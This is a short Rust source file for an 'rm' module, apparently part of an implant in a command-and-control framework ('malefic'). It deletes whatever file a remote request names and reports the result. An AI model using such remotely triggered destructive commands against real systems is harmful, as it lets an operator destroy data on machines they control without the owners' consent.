use crate::prelude::*;

pub struct Rm{}

#[async_trait]
#[module_impl("rm")]
impl Module for Rm {}

#[async_trait]
impl ModuleImpl for Rm {
       #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        // 尝试删除文件，如果失败则返回错误
        std::fs::remove_file(filename)?;


        Ok(TaskResult::new(id))
    }
}
